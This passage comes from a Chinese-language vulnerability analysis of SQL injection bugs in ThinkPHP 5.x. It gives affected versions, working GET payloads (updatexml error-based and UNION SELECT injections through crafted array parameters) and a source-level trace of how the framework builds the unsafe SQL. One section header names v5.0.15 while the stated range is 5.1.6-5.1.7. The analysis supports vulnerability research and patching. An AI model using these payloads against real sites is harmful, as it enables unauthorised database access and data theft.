    // 是否为存储过程调用
    $procedure = in_array(strtolower(substr(trim($sql), 0, 4)), ['call', 'exec']);
    // 参数绑定
    if ($procedure) {
        $this->bindParam($bind);
    } else {
        $this->bindValue($bind);
    }
    // 执行语句
    $this->PDOStatement->execute();
    // 调试结束
    $this->debug(false);
回到之前，如果我们传入的是数组，然后进入 `elseif (is_array($val) && !empty($val))`。
这里会判断 `$val[0]`，前面如果采用的是 `$_GET['username']` 来获取参数，那么三个分支都可以用来SQL注入，但是如果用的
`request()->get('username/a')` 来获取参数，那么 `exp` 会被过滤为 `exp`，这里就不去调试了。所以我们可以选用
`inc` 或者 `dec` ，传入 `username[0]=inc`。然后会将 `$val[1]` 与 `$val[2]` 拼接起来，赋值给
`$result[$item]` ，这就意味着不会产生之前的
``username`:":data__username"`，而是将我们的输入直接拼接到SQL语句中，这样，返回的SQL语句就变为了 `"INSERT
INTO `user` (`username` , `password`) VALUES
(updatexml(1,concat(0x7e,database(),0x7e),1)+1 , :data__password) "`，成功注入。
    elseif (is_array($val) && !empty($val)) {
        switch ($val[0]) {
            case 'exp':
                $result[$item] = $val[1];
                break;
            case 'inc':
                $result[$item] = $this->parseKey($val[1]) . '+' . floatval($val[2]);
                break;
            case 'dec':
                $result[$item] = $this->parseKey($val[1]) . '-' . floatval($val[2]);
                break;
        }
    }
## 0x04 ThinkPHP v5.0.15 SQL注入
###  0x00 影响范围
> ThinkPHP 5.1.6-5.1.7
###  0x01 演示版本
ThinkPHP v5.1.6  
PHP: php 7.3.4  
环境：Windows10
###  0x02 payload
`?username[0]=point&username[1]=0x7e,database(),0x7e),'1&username[2]=updatexml&username[3]=1',concat`
###  0x03 触发条件
报错注入需要开启debug模式
    // 应用调试模式
    'app_debug' => true,
添加一个路由进行insert。这里 `get('username/a')` 以数组的格式获取username，或者以全局数组
`$_GET['username']` 来获取参数。
    public function sql()
    {
        $username = request()->get('username/a');
        db('user')->where(['id' => 1])->update(['username' => $username]);
    }
###  0x04 调试分析
调用 `update()` 后接着调用 `$this->connection->update($this)`。
然后又调用 `$this->builder->update($query);` 生成UPDATE SQL语句，跟进。
接着我们又看到了熟悉的 `parseData()`，跟进看一下。
        public function update(Query $query)
        {
            $options = $query->getOptions();
            $table = $this->parseTable($query, $options['table']);
            $data  = $this->parseData($query, $options['data']);
            ......
        }
还是同样的先获取表的字段名，然后逐个对要插入的数据进行判断，如果传入的是字符串进入 `elseif
(is_scalar($val))`，传入的是数组的话进入 `elseif (is_array($val) &&
!empty($val))`。传入字符串的话还是和之前一样是预编译，不能进行注入，我们就直接来看传入数组的情况。
    protected function parseData(Query $query, $data = [], $fields = [], $bind = [], $suffix = '')
    {
        if (empty($data)) {
            return [];
        }
        $options = $query->getOptions();
        // 获取绑定信息
        if (empty($bind)) {
            $bind = $this->connection->getFieldsBind($options['table']);
        }
        if (empty($fields)) {
            if ('*' == $options['field']) {
                $fields = array_keys($bind);
            } else {
                $fields = $options['field'];
            }
        }
        $result = [];
        foreach ($data as $key => $val) {
            $item = $this->parseKey($query, $key);
            if ($val instanceof Expression) {
                $result[$item] = $val->getValue();
                continue;
            } elseif (!is_scalar($val) && (in_array($key, (array) $query->getOptions('json')) || 'json' == $this->connection->getFieldsType($options['table'], $key))) {
                $val = json_encode($val);
            } elseif (is_object($val) && method_exists($val, '__toString')) {
                // 对象数据写入
                $val = $val->__toString();
            }
            if (false !== strpos($key, '->')) {
                list($key, $name) = explode('->', $key);
                $item             = $this->parseKey($query, $key);
                $result[$item]    = 'json_set(' . $item . ', \'$.' . $name . '\', ' . $this->parseDataBind($query, $key, $val, $bind, $suffix) . ')';
            } elseif (false === strpos($key, '.') && !in_array($key, $fields, true)) {
                if ($options['strict']) {
                    throw new Exception('fields not exists:[' . $key . ']');
                }
            } elseif (is_null($val)) {
                $result[$item] = 'NULL';
            } elseif (is_array($val) && !empty($val)) {
                switch ($val[0]) {
                    case 'INC':
                        $result[$item] = $item . ' + ' . floatval($val[1]);
                        break;
                    case 'DEC':
                        $result[$item] = $item . ' - ' . floatval($val[1]);
                        break;
                    default:
                        $value = $this->parseArrayData($query, $val);
                        if ($value) {
                            $result[$item] = $value;
                        }
                }
            } elseif (is_scalar($val)) {
                // 过滤非标量数据
                $result[$item] = $this->parseDataBind($query, $key, $val, $bind, $suffix);
            }
        }
        return $result;
    }
不同于之前的是，这次在前两个分支中，进行拼接的是 `floatval($val[1])`，而不是直接将字符串进行拼接，显然是无法进行利用了，那我们来看看
`parseArrayData()`。
    elseif (is_array($val) && !empty($val)) {
        switch ($val[0]) {
            case 'INC':
                $result[$item] = $item . ' + ' . floatval($val[1]);
                break;
            case 'DEC':
                $result[$item] = $item . ' - ' . floatval($val[1]);
                break;
            default:
                $value = $this->parseArrayData($query, $val);
                if ($value) {
                    $result[$item] = $value;
                }
        }
    }
这里 `$type` 是数组的第一个值，`$value` 是数组的第二个值。这里让 `$type`
等于point，进入第一个分支。然后分别获取数组下标为2和下标为3的值。然后以 `$data[2] . '(\'' . $data[3] . '(' .
$data[1] . ')\')'` 的样式拼接起来，返回该值。随后将其拼接到SQL语句中，`"UPDATE `user` SET `username` =
updatexml('1',concat(0x7e,database(),0x7e),'1)') WHERE `id` = :where_AND_id
"`，注入成功。
    protected function parseArrayData(Query $query, $data)
    {
        list($type, $value) = $data;
        switch (strtolower($type)) {
            case 'point':
                $fun   = isset($data[2]) ? $data[2] : 'GeomFromText';
                $point = isset($data[3]) ? $data[3] : 'POINT';
                if (is_array($value)) {
                    $value = implode(' ', $value);
                }
                $result = $fun . '(\'' . $point . '(' . $value . ')\')';
                break;
            default:
                $result = false;
        }
        return $result;
    }
## 0x05 ThinkPHP v5.0.10 SQL注入
###  0x00 影响范围
> > =ThinkPHP 5.0.10
###  0x01 演示版本
ThinkPHP v5.0.10  
PHP: php 7.3.4  
环境：Windows10
###  0x02 payload
`?username[0]=NOT LIKE&username[1][0]=%&username[1][1]=So4ms&username[2]=)
union select 1,114514,database()%23`
###  0x03 触发条件
添加一个路由进行insert。这里 `get('username/a')` 以数组的格式获取username，或者以全局数组
`$_GET['username']` 来获取参数。
    public function sql()
    {
        $username = request()->get('username/a');
        $result = db('user')->where(['username' => $username])->select();
        print_r($result);
    }
###  0x04 调试分析
先调用 `select()` ，然后在其中调用 `$this->builder->select($options);`，生成查询SQL语句。然后调用
`$this->parseWhere($options['where'], $options),` ，跟进，又调用了 `parseWhereItem()`
处理查询条件。
    protected function parseWhereItem($field, $val, $rule = '', $options = [], $binds = [], $bindName = null)
    {
        // 字段分析
        $key = $field ? $this->parseKey($field, $options) : '';
        // 查询规则和条件
        if (!is_array($val)) {
            $val = ['=', $val];
        }
        list($exp, $value) = $val;
        // 对一个字段使用多个查询条件
        if (is_array($exp)) {
            $item = array_pop($val);
            // 传入 or 或者 and
            if (is_string($item) && in_array($item, ['AND', 'and', 'OR', 'or'])) {
                $rule = $item;
            } else {
                array_push($val, $item);
            }
            foreach ($val as $k => $item) {
                $bindName = 'where_' . str_replace('.', '_', $field) . '_' . $k;
                $str[]    = $this->parseWhereItem($field, $item, $rule, $options, $binds, $bindName);
            }
            return '( ' . implode(' ' . $rule . ' ', $str) . ' )';
        }
        // 检测操作符
        if (!in_array($exp, $this->exp)) {
            $exp = strtolower($exp);
            if (isset($this->exp[$exp])) {
                $exp = $this->exp[$exp];
            } else {
                throw new Exception('where express error:' . $exp);
            }
        }
        $bindName = $bindName ?: 'where_' . str_replace(['.', '-'], '_', $field);
        if (preg_match('/\W/', $bindName)) {
            // 处理带非单词字符的字段名
            $bindName = md5($bindName);
        }
        $bindType = isset($binds[$field]) ? $binds[$field] : PDO::PARAM_STR;
        if (is_scalar($value) && array_key_exists($field, $binds) && !in_array($exp, ['EXP', 'NOT NULL', 'NULL', 'IN', 'NOT IN', 'BETWEEN', 'NOT BETWEEN']) && strpos($exp, 'TIME') === false) {
            if (strpos($value, ':') !== 0 || !$this->query->isBind(substr($value, 1))) {
                if ($this->query->isBind($bindName)) {
                    $bindName .= '_' . str_replace('.', '_', uniqid('', true));
                }
                $this->query->bind($bindName, $value, $bindType);
                $value = ':' . $bindName;
            }
        }
        $whereStr = '';
        if (in_array($exp, ['=', '<>', '>', '>=', 'parseClosure($value);
            } else {
                $whereStr .= $key . ' ' . $exp . ' ' . $this->parseValue($value, $field);
            }
        } elseif ('LIKE' == $exp || 'NOT LIKE' == $exp) {
            // 模糊匹配
            if (is_array($value)) {
                foreach ($value as $item) {
                    $array[] = $key . ' ' . $exp . ' ' . $this->parseValue($item, $field);
                }
                $logic = isset($val[2]) ? $val[2] : 'AND';
                $whereStr .= '(' . implode($array, ' ' . strtoupper($logic) . ' ') . ')';
            } else {
                $whereStr .= $key . ' ' . $exp . ' ' . $this->parseValue($value, $field);
            }
        } elseif ('EXP' == $exp) {
            // 表达式查询
            $whereStr .= '( ' . $key . ' ' . $value . ' )';
        } elseif (in_array($exp, ['NOT NULL', 'NULL'])) {
            // NULL 查询
            $whereStr .= $key . ' IS ' . $exp;
        } elseif (in_array($exp, ['NOT IN', 'IN'])) {
            // IN 查询
            if ($value instanceof \Closure) {
                $whereStr .= $key . ' ' . $exp . ' ' . $this->parseClosure($value);
            } else {
                $value = array_unique(is_array($value) ? $value : explode(',', $value));
                if (array_key_exists($field, $binds)) {
                    $bind  = [];
                    $array = [];
                    $i     = 0;
                    foreach ($value as $v) {
                        $i++;
                        if ($this->query->isBind($bindName . '_in_' . $i)) {
                            $bindKey = $bindName . '_in_' . uniqid() . '_' . $i;
                        } else {
                            $bindKey = $bindName . '_in_' . $i;
                        }
                        $bind[$bindKey] = [$v, $bindType];
                        $array[]        = ':' . $bindKey;
                    }
                    $this->query->bind($bind);
                    $zone = implode(',', $array);
                } else {
                    $zone = implode(',', $this->parseValue($value, $field));
                }
                $whereStr .= $key . ' ' . $exp . ' (' . (empty($zone) ? "''" : $zone) . ')';
            }